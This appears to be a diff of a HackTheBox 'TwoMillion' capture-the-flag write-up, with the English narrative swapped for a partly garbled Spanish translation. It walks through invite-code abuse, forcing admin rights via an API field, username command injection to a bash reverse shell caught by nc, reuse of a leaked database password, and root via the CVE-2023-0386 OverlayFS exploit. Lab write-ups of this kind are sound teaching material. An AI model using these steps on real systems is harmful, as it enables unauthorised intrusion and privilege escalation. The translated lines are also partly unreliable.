@@ -82,29 +82,21 @@ ________________________________________________
 
 ### Website - TCP 8 <a href="#website---tcp-80" id="website---tcp-80"></a>
 
-It’s worth taking a look at the full page, as it has some fun easter eggs, including the original 32 machines, and the scoreboard from September 2017.
-
-Most of the links lead to places on the page. The link to `/login` gives a login form:
+`login`&#x20;
 
 ![image-20230602171248402](https://0xdf.gitlab.io/img/image-20230602171248402.png)
 
-I don’t have creds yet, so nothing here. The forgot password link doesn’t go anywhere.
-
-The “Join” section has a link to `/invite`:
+`/invite`:
 
 ![image-20230602171346375](https://0xdf.gitlab.io/img/image-20230602171346375.png)
 
-This page asks for an invite code, with a message that says “Feel free to hack your way in :)”:
-
 ![image-20230606145819478](https://0xdf.gitlab.io/img/image-20230606145819478.png)
-
-This is the original HackTheBox invite challenge - more [below](https://0xdf.gitlab.io/2023/06/07/htb-twomillion.html#background).
 
 **Tech Stack**
 
-The HTTP headers don’t give much additional information:
+Encabezado de HTTP
 
-```
+```bash
 HTTP/1.1 200 OK
 Server: nginx
 Date: Fri, 02 Jun 2023 21:13:15 GMT
@@ -116,18 +108,12 @@ Pragma: no-cache
 Content-Length: 64952
 ```
 
-The 404 page is the custom throwback HTB 404 page:
-
 ![image-20230602171611359](https://0xdf.gitlab.io/img/image-20230602171611359.png)
-
-I’m not able to guess any index page extensions.
 
 **Directory Brute Force**
 
-I’ll run `feroxbuster` against the site:
-
 ```
-oxdf@hacky$ feroxbuster -u http://2million.htb
+feroxbuster -u http://2million.htb
 
  ___  ___  __   __     __      __         __   ___
 |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
@@ -170,41 +156,33 @@ by Ben "epi" Risher 🤓                 ver: 2.9.3
 ...[snip]...
 ```
 
-There’s a few interesting things in here before it starts just spewing out 500 errors and I kill it. `/js/inviteapi.min.js` is interesting (and will be important soon). There is a `/register`, which provides a registration form (it still requires an invite code):
+`/js/inviteapi.min.js`es interesante . Hay un `/register`que proporciona un formulario de registro:
+
+
 
 ![image-20230602172032579](https://0xdf.gitlab.io/img/image-20230602172032579.png)
 
-There are a couple endpoints in `/api/v1/user`. I’ll note that `feroxbuster` finds these by looking at link targets, not be identifying `/api`. Therefore, it doesn’t brute force down this path. I may want to come back to that.
-
 ### Shell as www-data <a href="#shell-as-www-data" id="shell-as-www-data"></a>
 
-#### Invite Code Challenge <a href="#invite-code-challenge" id="invite-code-challenge"></a>
+**JavaScript**
 
-**Background**
-
-The Invite Code Challenge was a part of HackTheBox until April 2021. In order to register for an account, you had to hack yourself an invite code. This version is almost exactly the same (with some minor API endpoint changes) as it was back then.
-
-**Identify JavaScript**
-
-At the bottom of the page, there’s a `<script>` tag that includes `/js/inviteapi.min.js`:
+En la parte inferior de la página, hay una `<script>`etiqueta que incluye `/js/inviteapi.min.js`:
 
 ![image-20230602173705797](https://0xdf.gitlab.io/img/image-20230602173705797.png)
 
-The JavaScript is packed / minified, but at the bottom there’s two interesting strings:
-
 ![image-20230602174354605](https://0xdf.gitlab.io/img/image-20230602174354605.png)
 
-Back on `/invite` (where this code is loaded), I’ll open the browser dev tools, and start typing “make” at the console:
+De regreso `/invite`(donde se carga este código), abriré las herramientas de desarrollo del navegador y comenzaré a escribir "make" en la consola:
 
 ![image-20230602174516201](https://0xdf.gitlab.io/img/image-20230602174516201.png)
 
-It autocompletes that function as `makeInviteCode`. I’ll run it:
+Autocompleta esa función como `makeInviteCode`. Lo ejecutaré:
 
 ![image-20230602174549106](https://0xdf.gitlab.io/img/image-20230602174549106.png)
 
-**Decode Initial Data**
+**Decodificar datos iniciales**
 
-The raw JSON of the response is:
+El JSON sin formato de la respuesta es:
 
 ```
 {
@@ -218,27 +196,27 @@ The raw JSON of the response is:
 }
 ```
 
-The hint says the data is encrypted, and the `encytpe` says it’s ROT13. [rot13.com](https://rot13.com/) is a nice ROT13 decoder:
+La pista dice que los datos están cifrados y `encytpe`dice que son ROT13. [rot13.com](https://rot13.com/) es un buen decodificador ROT13:
 
 ![image-20230602174803269](https://0xdf.gitlab.io/img/image-20230602174803269.png)
 
-Or I can do it from the command line with `jq` and `tr`:
+O puedo hacerlo desde la línea de comando con `jq`y `tr`:
 
 ```
-oxdf@hacky$ curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate | jq -r '.data.data' | tr 'a-zA-Z' 'n-za-mN-ZA-M'
+curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate | jq -r '.data.data' | tr 'a-zA-Z' 'n-za-mN-ZA-M'
 In order to generate the invite code, make a POST request to /api/v1/invite/generate
 ```
 
-**Generate Code**
+**Generar codigo**
 
-To send a POST request to `/api/v1/invite/generate`, I’ll use `curl`. `-X [method]` is how to specify the request method:
+Para enviar una solicitud POST a `/api/v1/invite/generate`, usaré `curl`. `-X [method]`es cómo especificar el método de solicitud:
 
 ```
-oxdf@hacky$ curl -X POST http://2million.htb/api/v1/invite/generate
+curl -X POST http://2million.htb/api/v1/invite/generate
 {"0":200,"success":1,"data":{"code":"RzZXQUstVDBYNlktUk5CUk0tQUZYUFo=","format":"encoded"}}
 ```
 
-To view that nicely, I’ll add `-s` and pipe it into `jq`:
+Para verlo bien, lo agregaré `-s`y lo canalizaré en `jq`:
 
 ```
 oxdf@hacky$ curl -X POST http://2million.htb/api/v1/invite/generate -s | jq .
@@ -252,50 +230,50 @@ oxdf@hacky$ curl -X POST http://2million.htb/api/v1/invite/generate -s | jq .
 }
 ```
 
-**Decode Code**
+**Código de decodificación**
 
-The result this time says the format is “encoded”. Looking at the `code`, it is all numbers and letters and ends with `=`. That fits base64 encoding nicely. I’ll try decoding that:
+El resultado esta vez dice que el formato está "codificado". Mirando el `code`, son todos números y letras y terminan en `=`. Eso encaja muy bien con la codificación base64. Intentaré decodificar eso:
 
 ```
 oxdf@hacky$ echo "TUlQU1gtNDRFWkctVVNWVTgtMTk0VUs=" | base64 -d
 MIPSX-44EZG-USVU8-194UK
 ```
 
-That looks like an invite code. I can test it with the `verifyInviteCode` function in the dev tools console, and it reports it’s valid:
+Parece un código de invitación. Puedo probarlo con la `verifyInviteCode`función en la consola de herramientas de desarrollo y me informa que es válido:
 
-![image-20230602175237864](https://0xdf.gitlab.io/img/image-20230602175237864.png)
+![imagen-20230602175237864](https://0xdf.gitlab.io/img/image-20230602175237864.png)
 
-When I put that into the form on `/invite`, it redirects to `/register` with the code filled out:
+Cuando pongo eso en el formulario `/invite`, me redirige `/register`con el código completado:
 
-![image-20230602180134413](https://0xdf.gitlab.io/img/image-20230602180134413.png)
+![imagen-20230602180134413](https://0xdf.gitlab.io/img/image-20230602180134413.png)
 
-I’m able to register here and login.
+Puedo registrarme aquí e iniciar sesión.
 
-#### Authenticated Enumeration <a href="#authenticated-enumeration" id="authenticated-enumeration"></a>
+#### Enumeración autenticada <a href="#authenticated-enumeration" id="authenticated-enumeration"></a>
 
-**Website**
+**Sitio web**
 
-With an account, I’ve got access to what looks like the original HackTheBox website:
+Con una cuenta, tengo acceso a lo que parece el sitio web original de HackTheBox:
 
-[![image-20230602180451178](https://0xdf.gitlab.io/img/image-20230602180451178.png)](https://0xdf.gitlab.io/img/image-20230602180451178.png)[_Click for full image_](https://0xdf.gitlab.io/img/image-20230602180451178.png)
+[![imagen-20230602180451178](https://0xdf.gitlab.io/img/image-20230602180451178.png)](https://0xdf.gitlab.io/img/image-20230602180451178.png)[_Haga clic para ver la imagen completa_](https://0xdf.gitlab.io/img/image-20230602180451178.png)
 
-It says that the site is performing database migrations, and some features are unavailable. In reality, that means most. The Dashboard, Rules, and Change Log links under “Main” work, and have nice throwback pages to the original HTB.
+Dice que el sitio está realizando migraciones de bases de datos y algunas funciones no están disponibles. En realidad, eso significa la mayoría. Los enlaces del Panel de control, las Reglas y el Registro de cambios en "Principal" funcionan y tienen bonitas páginas de retroceso al HTB original.
 
-Under “Labs”, the only link that really works is the “Access” page, which leads to `/home/access`:
+En "Labs", el único enlace que realmente funciona es la página "Acceso", que conduce a `/home/access`:
 
-[![image-20230602180615851](https://0xdf.gitlab.io/img/image-20230602180615851.png)](https://0xdf.gitlab.io/img/image-20230602180615851.png)[_Click for full image_](https://0xdf.gitlab.io/img/image-20230602180615851.png)
+[![imagen-20230602180615851](https://0xdf.gitlab.io/img/image-20230602180615851.png)](https://0xdf.gitlab.io/img/image-20230602180615851.png)[_Haga clic para ver la imagen completa_](https://0xdf.gitlab.io/img/image-20230602180615851.png)
 
-Clicking on “Connection Pack” and “Regengerate” both return a `.ovpn` file. It’s a valid OpenVPN connection config, and I can try to connect with it, but it doesn’t work.
+Al hacer clic en "Paquete de conexión" y "Regenerar", se devuelve un `.ovpn`archivo. Es una configuración de conexión OpenVPN válida y puedo intentar conectarme con ella, pero no funciona.
 
 **API**
 
-“Connection Pack” sends a GET request to `/api/v1/user/vpn/generate`, and “Regenerate” sends a GET to `/api/v1/user/vpn/regenerate`.
+"Paquete de conexión" envía una solicitud GET a `/api/v1/user/vpn/generate`y "Regenerar" envía una solicitud GET a `/api/v1/user/vpn/regenerate`.
 
-I’ll send on of these requests to Burp Repeater and play with the API. `/api` returns a description:
+Enviaré estas solicitudes a Burp Repeater y jugaré con la API. `/api`devuelve una descripción:
 
-![image-20230602181111143](https://0xdf.gitlab.io/img/image-20230602181111143.png)
+![imagen-20230602181111143](https://0xdf.gitlab.io/img/image-20230602181111143.png)
 
-`/api/v1` returns details of the full API:
+`/api/v1`devuelve detalles de la API completa:
 
 ```
 {
@@ -331,73 +309,73 @@ I’ll send on of these requests to Burp Repeater and play with the API. `/api` 
 }
 ```
 
-**Enumerate Admin API**
+**Enumerar API de administrador**
 
-Unsurprisingly, I am not an admin:
+Como era de esperar, no soy administrador:
 
-![image-20230602181807231](https://0xdf.gitlab.io/img/image-20230602181807231.png)
+![imagen-20230602181807231](https://0xdf.gitlab.io/img/image-20230602181807231.png)
 
-If I try to POST to `/api/v1/admin/vpn/generate`, it returns 401 Unauthorized:
+Si intento PUBLICAR en `/api/v1/admin/vpn/generate`, devuelve 401 No autorizado:
 
-![image-20230602181939091](https://0xdf.gitlab.io/img/image-20230602181939091.png)
+![imagen-20230602181939091](https://0xdf.gitlab.io/img/image-20230602181939091.png)
 
-However, a PUT request to `/api/v1/admin/settings/update` doesn’t return 401, but 200, with a different error in the body:
+Sin embargo, una solicitud PUT `/api/v1/admin/settings/update`no devuelve 401, sino 200, con un error diferente en el cuerpo:
 
-![image-20230602182052397](https://0xdf.gitlab.io/img/image-20230602182052397.png)
+![imagen-20230602182052397](https://0xdf.gitlab.io/img/image-20230602182052397.png)
 
-#### Get Admin Access <a href="#get-admin-access" id="get-admin-access"></a>
+#### Obtenga acceso de administrador <a href="#get-admin-access" id="get-admin-access"></a>
 
-I’ll poke at this endpoint a bit more. As it says the content type is invalid, I’ll look at the `Content-Type` header in my request. There is none so I’ll add one. As the site seems to like JSON, I’ll set it to that:
+Profundizaré un poco más en este punto final. Como dice que el tipo de contenido no es válido, miraré el `Content-Type`encabezado de mi solicitud. No hay ninguno, así que agregaré uno. Como parece que al sitio le gusta JSON, lo configuraré así:
 
-![image-20230602182213019](https://0xdf.gitlab.io/img/image-20230602182213019.png)
+![imagen-20230602182213019](https://0xdf.gitlab.io/img/image-20230602182213019.png)
 
-Now it says email is missing. I’ll add that in the body in JSON:
+Ahora dice que falta el correo electrónico. Agregaré eso en el cuerpo en JSON:
 
-![image-20230602182248469](https://0xdf.gitlab.io/img/image-20230602182248469.png)
+![imagen-20230602182248469](https://0xdf.gitlab.io/img/image-20230602182248469.png)
 
-Now it wants `is_admin`, so I’ll add that as `true`:
+Ahora quiere `is_admin`, así que lo agregaré como `true`:
 
-![image-20230602182332129](https://0xdf.gitlab.io/img/image-20230602182332129.png)
+![imagen-20230602182332129](https://0xdf.gitlab.io/img/image-20230602182332129.png)
 
-It’s looking for 0 or 1. I’ll set it to 1, and it seems to work:
+Está buscando 0 o 1. Lo configuraré en 1 y parece funcionar:
 
-![image-20230602182418615](https://0xdf.gitlab.io/img/image-20230602182418615.png)
+![imagen-20230602182418615](https://0xdf.gitlab.io/img/image-20230602182418615.png)
 
-If I try the verification again, it says true!
+Si intento la verificación nuevamente, ¡dice verdadero!
 
-![image-20230602182448977](https://0xdf.gitlab.io/img/image-20230602182448977.png)
+![imagen-20230602182448977](https://0xdf.gitlab.io/img/image-20230602182448977.png)
 
-#### Command Injection <a href="#command-injection" id="command-injection"></a>
+#### Inyección de comando <a href="#command-injection" id="command-injection"></a>
 
-**Enumerate generate API**
+**Enumerar generar API**
 
-As my account is now an admin, I don’t get a 401 response anymore from `/api/v1/admin/vpn/generate`:
+Como mi cuenta ahora es administradora, ya no recibo una respuesta 401 de `/api/v1/admin/vpn/generate`:
 
-![image-20230603130348431](https://0xdf.gitlab.io/img/image-20230603130348431.png)
+![imagen-20230603130348431](https://0xdf.gitlab.io/img/image-20230603130348431.png)
 
-I’ll add my username, and it generates a VPN key:
+Agregaré mi nombre de usuario y generaré una clave VPN:
 
-![image-20230603130429280](https://0xdf.gitlab.io/img/image-20230603130429280.png)
+![imagen-20230603130429280](https://0xdf.gitlab.io/img/image-20230603130429280.png)
 
-My account is now admin.
+Mi cuenta ahora es administrador.
 
-**Injection**
+**Inyección**
 
-It’s probably not PHP code that generates a VPN key, but rather some Bash tools that generate the necessary information for a VPN key.
+Probablemente no sea el código PHP el que genera una clave VPN, sino algunas herramientas Bash que generan la información necesaria para una clave VPN.
 
-It’s worth checking if there is any command injection.
+Vale la pena comprobar si hay alguna inyección de comando.
 
-If the server is doing something like `gen_vpn.sh [username]`, then I’ll try putting a `;` in the username to break that into a new command. I’ll also add a `#` at the end to comment out anything that might come after my input. It works:
+Si el servidor está haciendo algo como `gen_vpn.sh [username]`, intentaré poner un `;`nombre de usuario en el nombre de usuario para dividirlo en un nuevo comando. También agregaré un `#`al final para comentar cualquier cosa que pueda surgir después de mi entrada. Funciona:
 
-![image-20230603130843584](https://0xdf.gitlab.io/img/image-20230603130843584.png)
+![imagen-20230603130843584](https://0xdf.gitlab.io/img/image-20230603130843584.png)
 
-**Shell**
+**Caparazón**
 
-To get a shell, I’ll start `nc` listening on my host, and put a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) in as the username:
+Para obtener un shell, comenzaré a `nc`escuchar en mi host y colocaré un [shell inverso de bash](https://www.youtube.com/watch?v=OjkVep2EIlw) como nombre de usuario:
 
-![image-20230603131015532](https://0xdf.gitlab.io/img/image-20230603131015532.png)
+![imagen-20230603131015532](https://0xdf.gitlab.io/img/image-20230603131015532.png)
 
-On sending this, I get a shell at my `nc`:
+Al enviar esto, recibo un shell en mi `nc`:
 
 ```
 oxdf@hacky$ nc -lnvp 443
@@ -408,7 +386,7 @@ bash: no job control in this shell
 www-data@2million:~/html$
 ```
 
-I’ll upgrade the shell using the `script` / `stty` [trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):
+Actualizaré el shell usando el [truco](https://www.youtube.com/watch?v=DqE6DxqJg8Q)`script` / :`stty`
 
 ```
 www-data@2million:~/html$ script /dev/null -c bash
@@ -424,11 +402,11 @@ Terminal type? screen
 www-data@2million:~/html$
 ```
 
-### Shell as admin <a href="#shell-as-admin" id="shell-as-admin"></a>
+### Shell como administrador <a href="#shell-as-admin" id="shell-as-admin"></a>
 
-#### Enumeration <a href="#enumeration" id="enumeration"></a>
+#### Enumeración <a href="#enumeration" id="enumeration"></a>
 
-The web root is in the default location, `/var/www/html`:
+La raíz web está en la ubicación predeterminada `/var/www/html`:
 
 ```
 www-data@2million:~/html$ ls -la
@@ -449,9 +427,9 @@ drwxr-xr-x  2 root root 4096 Jun  2 16:15 views
 drwxr-xr-x  5 root root 4096 Jun  2 22:30 VPN
 ```
 
-`index.php` defines a bunch of routes for the various pages and endpoints used on the website.
+`index.php`define un montón de rutas para las distintas páginas y puntos finales utilizados en el sitio web.
 
-There’s a `.env` file as well. This file is commonly used in PHP web frame works to set environment variables for use by the application. This application is more faking a `.env` file rather than actually using it in a framework, but the `.env` file still looks the same:
+También hay un `.env`archivo. Este archivo se usa comúnmente en trabajos de marco web PHP para establecer variables de entorno para uso de la aplicación. Esta aplicación es más una falsificación de un `.env`archivo que un uso real en un marco, pero el `.env`archivo sigue teniendo el mismo aspecto:
 
 ```
 DB_HOST=127.0.0.1
@@ -460,9 +438,9 @@ DB_USERNAME=admin
 DB_PASSWORD=SuperDuperPass123
 ```
 
-#### su / SSH <a href="#su--ssh" id="su--ssh"></a>
+#### su/SSH <a href="#su--ssh" id="su--ssh"></a>
 
-That password works for both `su` as admin:
+Esa contraseña funciona tanto para `su`administrador:
 
 ```
 www-data@2million:~/html$ su - admin
@@ -473,7 +451,7 @@ See "man sudo_root" for details.
 admin@2million:~$
 ```
 
-And SSH:
+Y SSH:
 
 ```
 oxdf@hacky$ sshpass -p SuperDuperPass123 ssh admin@2million.htb
@@ -484,22 +462,22 @@ You have mail.
 admin@2million:~$
 ```
 
-Either way, I can grab `user.txt`:
+De cualquier manera, puedo agarrar `user.txt`:
 
 ```
 admin@2million:~$ cat user.txt
 277c1481************************
 ```
 
-### Shell as root <a href="#shell-as-root" id="shell-as-root"></a>
+### Shell como raíz <a href="#shell-as-root" id="shell-as-root"></a>
 
-#### Enumeration <a href="#enumeration-1" id="enumeration-1"></a>
+#### Enumeración <a href="#enumeration-1" id="enumeration-1"></a>
 
-**Mail**
+**Correo**
 
-This exploit could actually be carried out as www-data. But if I do get to admin, there is a hint as to where to look.
+En realidad, este exploit podría llevarse a cabo como www-data. Pero si llego al administrador, hay una pista sobre dónde buscar.
 
-When I logged in over SSH, there was a line in the banner that said admin had mail. That is held in `/var/mail/admin`:
+Cuando inicié sesión a través de SSH, había una línea en el banner que decía que el administrador tenía correo. Que se celebra en `/var/mail/admin`:
 
 ```
 From: ch4p <ch4p@2million.htb>
@@ -517,11 +495,11 @@ I'm know you're working as fast as you can to do the DB migration. While we're p
 HTB Godfather
 ```
 
-It talks about needing to patch the OS as well, and mentions a OverlayFS / FUSE CVE.
+También habla de la necesidad de parchear el sistema operativo y menciona un OverlayFS/FUSE CVE.
 
-**Identify Vulnerability**
+**Identificar vulnerabilidad**
 
-TwoMillion is running Ubuntu 22.04 with the kernel 5.15.70:
+TwoMillion ejecuta Ubuntu 22.04 con el kernel 5.15.70:
 
 ```
 admin@2million:~$ uname -a
@@ -533,37 +511,37 @@ DISTRIB_CODENAME=jammy
 DISTRIB_DESCRIPTION="Ubuntu 22.04.2 LTS"
 ```
 
-A search for “linux kernel vulnerability fuse overlayfs” limited to the last year returns a bunch of stuff about CVE-2023-0386:
+Una búsqueda de “superposiciones de fusibles de vulnerabilidad del kernel de Linux” limitada al último año arroja un montón de cosas sobre CVE-2023-0386:
 
-![image-20230602185030063](https://0xdf.gitlab.io/img/image-20230602185030063.png)
+![imagen-20230602185030063](https://0xdf.gitlab.io/img/image-20230602185030063.png)
 
-It’s a bit hard to figure out exactly what versions are effected. [This Ubuntu page](https://ubuntu.com/security/CVE-2023-0386) shows that it’s fixed in 5.15.0-70.77:
+Es un poco difícil determinar exactamente qué versiones se ven afectadas. [Esta página de Ubuntu](https://ubuntu.com/security/CVE-2023-0386) muestra que está arreglado en 5.15.0-70.77:
 
-![image-20230602185832675](https://0xdf.gitlab.io/img/image-20230602185832675.png)
+![imagen-20230602185832675](https://0xdf.gitlab.io/img/image-20230602185832675.png)
 
-It’s not clear how that compares to 5.15.70-051570-generic. That said, this was published on 22 March 2023, and the `uname -a` string shows a compile date of 23 September 2022.
+No está claro cómo se compara con 5.15.70-051570-generic. Dicho esto, esto se publicó el 22 de marzo de 2023 y la `uname -a`cadena muestra una fecha de compilación del 23 de septiembre de 2022.
 
 #### CVE-2023-0386 <a href="#cve-2023-0386" id="cve-2023-0386"></a>
 
-**Background**
+**Fondo**
 
-[This blog](https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/) from Datadog does a really nice job going into the details of the exploit. The issue has to do with the overlay file system, and how files are moved between them. To exploit this, an attacker first creates a FUSE (File System in User Space) file system, and adds a binary that is owned by userid 0 in that file system and has the SetUID bit set. The error in OverlayFS allows for that file to be copied out of the FUSE FS into the main on maintaining it’s owner and SetUID.
+[Este blog](https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/) de Datadog hace un muy buen trabajo al analizar los detalles del exploit. El problema tiene que ver con el sistema de archivos superpuesto y cómo se mueven los archivos entre ellos. Para explotar esto, un atacante primero crea un sistema de archivos FUSE (Sistema de archivos en el espacio del usuario) y agrega un binario que pertenece al ID de usuario 0 en ese sistema de archivos y tiene el bit SetUID establecido. El error en OverlayFS permite que ese archivo se copie de FUSE FS al archivo principal manteniendo su propietario y SetUID.
 
-**Exploit**
+**Explotar**
 
-There’s a [POC for this exploit](https://github.com/xkaneiki/CVE-2023-0386) on GitHub from researcher xkaneiki. The `README.md` is sparse, but gives enough instruction for use.
+Hay una [prueba de concepto para este exploit](https://github.com/xkaneiki/CVE-2023-0386) en GitHub del investigador xkaneiki. Es `README.md`escaso, pero proporciona suficientes instrucciones de uso.
 
-I’ll download the ZIP version of the repo:
+Descargaré la versión ZIP del repositorio:
 
-![image-20230602190651754](https://0xdf.gitlab.io/img/image-20230602190651754.png)
+![imagen-20230602190651754](https://0xdf.gitlab.io/img/image-20230602190651754.png)
 
-I’ll upload it to 2million with `scp`:
+Lo subiré a 2millones con `scp`:
 
 ```
 oxdf@hacky$ sshpass -p SuperDuperPass123 scp CVE-2023-0386-main.zip admin@2million.htb:/tmp/
 ```
 
-I’ll need two shells on 2million, which is easy to do with SSH. I’ll unzip the exploit, go into the folder, and run `make all` like it says in the `README.md`:
+Necesitaré dos shells en 2 millones, lo cual es fácil de hacer con SSH. Descomprimiré el exploit, iré a la carpeta y lo ejecutaré `make all`como dice en `README.md`:
 
 ```
 admin@2million:/tmp$ unzip CVE-2023-0386-main.zip 
@@ -587,23 +565,23 @@ gcc -o exp exp.c -lcap
 gcc -o gc getshell.c
 ```
 
-It throws some errors, but there are now three binaries that weren’t there before:
+Genera algunos errores, pero ahora hay tres archivos binarios que no estaban allí antes:
 
 ```
 admin@2million:/tmp/CVE-2023-0386-main$ ls
 exp  exp.c  fuse  fuse.c  gc  getshell.c  Makefile  ovlcap  README.md  test
 ```
 
-In the first session, I’ll run the next command from the instructions:
+En la primera sesión, ejecutaré el siguiente comando de las instrucciones:
 
 ```
 admin@2million:/tmp/CVE-2023-0386-main$ ./fuse ./ovlcap/lower ./gc
 [+] len of gc: 0x3ee0
 ```
 
-It hangs.
+Se cuelga.
 
-In the other window, I’ll run the exploit:
+En la otra ventana, ejecutaré el exploit:
 
 ```
 admin@2million:/tmp/CVE-2023-0386-main$ ./exp 
@@ -620,9 +598,9 @@ See "man sudo_root" for details.
 root@2million:/tmp/CVE-2023-0386-main#
 ```
 
-That’s a root shell!
+¡Ese es un shell raíz!
 
-I’ll grab `root.txt`:
+Voy a agarrar `root.txt`:
 
 ```
 root@2million:/root# cat root.txt
